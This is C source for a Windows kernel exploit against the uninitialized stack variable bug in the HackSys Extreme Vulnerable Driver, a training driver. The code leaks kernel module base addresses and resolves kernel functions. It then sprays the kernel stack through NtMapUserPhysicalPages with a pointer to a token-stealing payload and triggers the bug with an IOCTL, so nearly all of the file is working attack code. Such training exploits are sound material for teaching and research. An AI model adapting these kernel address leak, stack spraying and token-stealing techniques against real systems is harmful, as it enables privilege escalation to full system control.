/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]payatu[dot]com
Website: http://www.payatu.com/

Copyright (C) 2011-2016 Payatu Technologies Pvt. Ltd. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedStackVariable.c

Abstract:
    This module implements the exploit for Uninitialized
    Stack Variable Vulnerability implemented in HackSys
    Extreme Vulnerable Driver.

--*/

#include "UninitializedStackVariable.h"

VOID ResolveKernelAPIs() {
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    PVOID HalDispatchTable = NULL;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

    DEBUG_INFO("\t\t[+] Resolving Kernel APIs\n");

    hNtDll = LoadLibrary("ntdll.dll");

    if (!hNtDll) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtQuerySystemInformation: 0x%p\n", NtQuerySystemInformation);
    }

    NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(hNtDll, "NtMapUserPhysicalPages");

    if (!NtMapUserPhysicalPages) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving NtMapUserPhysicalPages: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        DEBUG_INFO("\t\t\t[+] NtMapUserPhysicalPages: 0x%p\n", NtMapUserPhysicalPages);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                                     HEAP_ZERO_MEMORY,
                                                                     ReturnLength);

    if (!pSystemModuleInformation) {
        DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
                                        pSystemModuleInformation,
                                        ReturnLength,
                                        &ReturnLength);

    if (NtStatus != STATUS_SUCCESS) {
        DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

    hKernelInUserMode = LoadLibraryA(KernelImage);

    if (!hKernelInUserMode) {
        DEBUG_ERROR("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    ZwOpenProcess = (ZwOpenProcess_t)GetProcAddress(hKernelInUserMode, "ZwOpenProcess");

    if (!ZwOpenProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwOpenProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess - (ULONG)hKernelInUserMode);
        ZwOpenProcess = (ZwOpenProcess_t)((ULONG)ZwOpenProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwOpenProcess: 0x%p\n", ZwOpenProcess);
    }

    ZwOpenProcessToken = (ZwOpenProcessToken_t)GetProcAddress(hKernelInUserMode, "ZwOpenProcessToken");

    if (!ZwOpenProcessToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwOpenProcessToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken - (ULONG)hKernelInUserMode);
        ZwOpenProcessToken = (ZwOpenProcessToken_t)((ULONG)ZwOpenProcessToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwOpenProcessToken: 0x%p\n", ZwOpenProcess);
    }

    ZwDuplicateToken = (ZwDuplicateToken_t)GetProcAddress(hKernelInUserMode, "ZwDuplicateToken");

    if (!ZwDuplicateToken) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwDuplicateToken: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken - (ULONG)hKernelInUserMode);
        ZwDuplicateToken = (ZwDuplicateToken_t)((ULONG)ZwDuplicateToken + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwDuplicateToken: 0x%p\n", ZwDuplicateToken);
    }

    PsGetCurrentProcess = (PsGetCurrentProcess_t)GetProcAddress(hKernelInUserMode, "PsGetCurrentProcess");

    if (!PsGetCurrentProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving PsGetCurrentProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess - (ULONG)hKernelInUserMode);
        PsGetCurrentProcess = (PsGetCurrentProcess_t)((ULONG)PsGetCurrentProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] PsGetCurrentProcess: 0x%p\n", PsGetCurrentProcess);
    }

    ZwSetInformationProcess = (ZwSetInformationProcess_t)GetProcAddress(hKernelInUserMode, "ZwSetInformationProcess");

    if (!ZwSetInformationProcess) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwSetInformationProcess: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess - (ULONG)hKernelInUserMode);
        ZwSetInformationProcess = (ZwSetInformationProcess_t)((ULONG)ZwSetInformationProcess + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwSetInformationProcess: 0x%p\n", ZwSetInformationProcess);
    }

    ZwClose = (ZwClose_t)GetProcAddress(hKernelInUserMode, "ZwClose");

    if (!ZwClose) {
        DEBUG_ERROR("\t\t\t[-] Failed Resolving ZwClose: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    else {
        ZwClose = (ZwClose_t)((ULONG)ZwClose - (ULONG)hKernelInUserMode);
        ZwClose = (ZwClose_t)((ULONG)ZwClose + (ULONG)KernelBaseAddressInKernelMode);
        DEBUG_INFO("\t\t\t[+] ZwClose: 0x%p\n", ZwClose);
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    if (hKernelInUserMode) {
        FreeLibrary(hKernelInUserMode);
    }

    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;
}

DWORD WINAPI UninitializedStackVariableThread(LPVOID Parameter) {
    UINT32 i = 0;
    ULONG BytesReturned;
    HANDLE hFile = NULL;
    ULONG MagicValue = 0xBAADF00D;
    PULONG StackSprayBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PVOID EopPayload = &TokenStealingPayloadDuplicateToken;
    SIZE_T StackSprayBufferSize = 1024 * sizeof(ULONG_PTR);

    __try {
        DEBUG_MESSAGE("\t[+] Setting Thread Priority\n");

        if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
            DEBUG_ERROR("\t\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n");
        }
        else {
            DEBUG_INFO("\t\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\n");
        }

        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                             HEAP_ZERO_MEMORY,
                                             StackSprayBufferSize);

        if (!StackSprayBuffer) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", StackSprayBuffer);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", StackSprayBufferSize);
        }

        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");

        for(i = 0; i < StackSprayBufferSize / sizeof(ULONG_PTR); i++) {
            StackSprayBuffer[i] = (ULONG)EopPayload;
        }

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        ResolveKernelAPIs();

        DEBUG_INFO("\t\t[+] Spraying the Kernel Stack\n");
        DEBUG_MESSAGE("\t[+] Triggering Use of Uninitialized Stack Variable\n");

        OutputDebugString("****************Kernel Mode****************\n");

        // HackSys Extreme Vulnerable driver itself provides a decent interface
        // to spray the stack using Stack Overflow vulnerability. However, j00ru
        // on his blog disclosed a Windows API that can be used to spray stack up to
        // 1024*sizeof(ULONG_PTR) bytes (http://j00ru.vexillium.org/?p=769). Since,
        // it's a Windows API and available on Windows by default, I decided to use
        // it instead of this driver's Stack Overflow interface.
        NtMapUserPhysicalPages(NULL, 1024, StackSprayBuffer);

        // Kernel Stack should not be used for anything else as it
        // will corrupt the current sprayed state. So, we will directly
        // trigger the vulnerability without putting any Debug prints.
        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE,
                        (LPVOID)&MagicValue,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)StackSprayBuffer);

        StackSprayBuffer = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}
